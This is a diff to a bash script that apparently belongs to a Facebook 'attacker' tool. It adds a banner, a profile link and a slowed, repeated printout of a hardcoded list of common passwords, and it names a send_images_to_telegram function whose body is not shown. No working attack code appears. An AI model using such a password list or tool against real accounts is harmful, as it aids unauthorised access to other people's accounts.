@@ -13,6 +13,7 @@ RED='\033[1;31m'
 GREEN='\033[1;32m'
 YELLOW='\033[1;33m'
 BLUE='\033[1;34m'
+CYAN='\033[1;36m'
 RESET='\033[0m'
 
 #-------------------
@@ -30,6 +31,7 @@ display_logo() {
 ╚═╝  ╚═╝╚══════╝╚═╝     ╚═╝╚═╝  ╚═╝╚═╝╚═╝  ╚═╝╚═╝
     '
     echo -e "${RESET}"
+    echo -e "${BLUE}https://www.facebook.com/w1Hema${RESET}"
 }
 
 #-------------------
@@ -50,7 +52,10 @@ send_images_to_telegram() {
 #   Show Predefined Passwords
 #-------------------
 show_passwords() {
-    local passwords=(
+    echo -e "${BLUE}\nfacebook _Hema_Ataker _tool${RESET}"
+    echo -e "${RED}Common Passwords List:${RESET}"
+    
+    passwords=(
         "123456" "password" "12345678" "qwerty" "123456789" "12345" "1234" "111111"
         "1234567123456" "password" "12345678" "qwerty" "123456789" "12345" "1234"
         "111111" "1234567" "dragon" "123123" "baseball" "abc123" "football" "monkey"
@@ -67,9 +72,11 @@ show_passwords() {
         "987654321" "dallas" "austin" "thunder" "taylor" "matrix" "minecraft"
     )
     
-    echo -e "${RED}Common Passwords List:${RESET}"
-    for pass in "${passwords[@]}"; do
-        echo -e "${RED}$pass${RESET}"
+    for i in {1..2}; do
+        for pass in "${passwords[@]}"; do
+            echo -e "${RED}$pass${RESET}"
+            sleep 0.5
+        done
     done
 }
 
